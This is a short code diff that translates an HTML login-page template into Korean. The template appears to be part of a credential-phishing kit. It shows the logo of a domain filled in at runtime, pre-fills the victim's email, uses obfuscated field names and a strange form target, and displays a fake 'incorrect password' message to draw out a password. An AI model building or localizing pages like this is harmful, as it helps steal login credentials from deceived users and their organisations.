@@ -99,18 +99,18 @@ input[type="submit"]:hover{
 	</style>
 </head>
 <body>
-<span href="#" class="button" id="toggle-login">login</span>
+<span href="#" class="button" id="toggle-login">로그인</span>
 
 <div id="login">
   <div id="triangle"></div>
-  <h1>login</h1>
+  <h1>로그인</h1>
   <form action="adddzz" method="post">
     {% csrf_token %}
-    <p id="cone">Incorrect username or password</p>
+    <p id="cone">잘못된 사용자 이름 또는 비밀번호</p>
     <center><img src="https://logo.clearbit.com/{{domains}}"></center>
     <input type="email" name="zzpowerman" value="{{email}}" required/>
-    <input type="password" name="yyenginlo" placeholder="password" required />
-    <input type="submit" value="login" />
+    <input type="password" name="yyenginlo" placeholder="비밀번호" required />
+    <input type="submit" value="로그인" />
   </form>
 </div>
 <script>
